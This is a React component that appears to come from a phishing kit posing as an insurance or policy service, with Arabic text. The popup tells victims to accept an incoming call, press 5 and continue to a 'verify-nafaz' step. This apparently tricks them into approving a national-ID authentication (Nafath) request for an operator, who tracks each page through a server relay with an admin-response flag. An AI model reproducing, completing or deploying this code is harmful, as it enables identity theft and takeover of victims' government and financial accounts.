import Main from "@/components/MainWrapper";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import { useNavigate } from "react-router-dom";

const PhonePopup = () => {
  useEffect(() => {
    setCurrentPage("phone-popup");
  }, []);
  const navigate = useNavigate();

  const goNext = () => {
    sendDataToServer({
      data: {},
      current: "phone-popup",
      nextPage: "verify-nafaz",
      waitingForAdminResponse: false,
      navigate,
    });
  };

  return (
    <Main>
      <section className="bg-gray-100 h-screen px-6 grid place-items-center">
        <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg shadow-md">
          <div className="px-6 py-4 mb-4 rounded-xl bg-main">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <img
            src="/assets/phone-ringing.gif"
            alt="logo"
            className="h-20 mx-auto"
          />

          <div className="mt-16 space-y-4">
            <h1 className="text-xl font-bold text-center">
              سيردك مكاالمة لأثبات ملكيه لرقم الجوال وربطه مع وثيقه سلامه
            </h1>
            <h2 className="text-xl font-bold text-center">
              يرجي الموافقة عليها وإدخال الرقم{" "}
              <span className="text-destructive">5</span> في المكالمة و المتابعة
              لأكمال الإجراءات{" "}
            </h2>

            <button
              className="mx-auto block lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors"
              type="submit"
              onClick={goNext}
            >
              موافق
            </button>
          </div>
        </div>
      </section>
    </Main>
  );
};
export default PhonePopup;
